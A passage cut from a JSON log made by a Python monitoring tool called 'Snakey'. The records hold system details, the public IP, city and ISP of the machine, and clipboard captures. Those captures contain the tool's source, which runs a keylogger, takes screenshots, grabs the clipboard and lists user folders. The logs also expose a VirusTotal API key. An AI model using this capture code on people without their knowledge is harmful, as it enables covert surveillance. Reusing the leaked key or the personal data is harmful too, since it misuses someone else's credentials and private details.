session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "d94d8486cb092eda961b98f19aa1a940564ed1ba7c185050f6a9a2ac233cbdef", "screenshot_hash": "2044755106896e1460fe4f365e975a116c9e875b6023004eb45a6879351116ee", "log_hash": "ee0b3b493371811f1f86055bf6fc7d533c024f56cf44f15b7e20b498b4af150e"}
{"timestamp": "2025-05-21T12:00:22.439721", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        # === Public IP and ISP lookup ===\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "d94d8486cb092eda961b98f19aa1a940564ed1ba7c185050f6a9a2ac233cbdef", "screenshot_hash": "3f4159a1765f2009f5a0c5e623c71805c77382904ad43a9180f2f50429b425e2", "log_hash": "9d5cc720e85180258eed9c36f0bc83c1f682bf9cbf496ddcb193c54f7593491d"}
{"timestamp": "2025-05-21T12:02:49.969504", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        # === Public IP and ISP lookup ===\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        # Load existing logs\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        # Load or initialize ledger as a list of dicts\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n            # If ledger is a list of strings (legacy), convert to list of dicts\r\n            if ledger and isinstance(ledger[0], str):\r\n                ledger = [{\r\n                    \"timestamp\": \"unknown\",\r\n                    \"log_hash\": h,\r\n                    \"previous_hash\": \"0\" * 64,\r\n                    \"chained_hash\": \"0\" * 64\r\n                } for h in ledger]\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "99ce0cbdec63535bc7291b21a7fd6a36dbd945b24d690bdd623a690f8e4c7c03", "screenshot_hash": "1241951cb59d7e97da4a501bd5d3c2671c14d74652cd1d73187854200f7d807d", "log_hash": "9dd97bbf1a96010826ee36902bd6c50ccad8f3a63e8de237776de409afd869f7"}
{"timestamp": "2025-05-21T12:03:16.191298", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": 